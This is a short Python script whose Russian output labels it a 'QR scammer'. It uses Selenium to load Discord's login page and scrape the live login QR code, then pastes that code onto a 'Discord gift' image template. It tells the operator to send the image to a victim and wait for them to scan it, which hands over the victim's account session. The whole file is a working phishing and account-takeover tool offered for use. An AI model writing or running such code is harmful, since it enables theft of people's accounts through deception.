from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64
import time
import os

# By Jupiter404E

def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)

def paste_template():
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)

def main():
    print('** QR Скамер **')
    print('** By Jupiter404E **')

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)

    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')

    driver.get('https://discord.com/login')
    time.sleep(5)
    print('- Старница загружена.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = soup.find('img')['src']
    file = os.path.join(os.getcwd(), 'temp\\qr_code.png')

    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print('- QR-код сгенерирован. > discord_gift.png')
    print('Отправьте QR-код пользователю. Ожидайте пока он отсканирует его...')

if __name__ == '__main__':
    main()